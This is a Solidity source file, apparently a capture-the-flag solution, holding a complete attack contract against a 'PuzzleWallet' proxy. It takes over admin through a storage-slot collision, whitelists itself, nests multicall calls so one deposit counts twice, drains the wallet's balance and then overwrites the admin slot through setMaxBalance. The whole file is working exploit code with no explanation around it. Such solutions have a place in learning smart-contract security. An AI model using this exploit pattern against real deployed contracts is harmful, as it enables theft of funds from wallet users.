// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IPuzzleWallet.sol";

contract PuzzleWalletAttack {
    function attack(IPuzzleWallet target) external payable {
        require(msg.value == address(target).balance, "PuzzleWallet: Value must be eq");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = address(target).call(abi.encodeWithSignature("proposeNewAdmin(address)", address(this)));

        require(isSuccess, "PuzzleWallet: Call error");

        require(address(this) == target.owner(), "PuzzleWallet: Wrong address");

        target.addToWhitelist(address(this));

        require(target.whitelisted(address(this)), "PuzzleWallet: Wrong res");

        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = abi.encodeWithSelector(target.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(target.multicall.selector, multicallData);

        data[1] = data[0];

        target.multicall{ value: msg.value }(data);

        uint256 balance = target.balances(address(this));

        require(2 * msg.value == balance, "PuzzleWallet: Wrong balance");

        target.execute(address(this), balance, "");

        // solhint-disable-next-line reason-string
        require(0 == address(target).balance, "PuzzleWallet: Wrong victim balance");

        target.setMaxBalance(uint256(uint160(msg.sender)));

        require(msg.sender == address(uint160(target.maxBalance())), "PuzzleWallet: Attack failed");
    }

    // solhint-disable-next-line no-empty-blocks
    receive() external payable {}
}
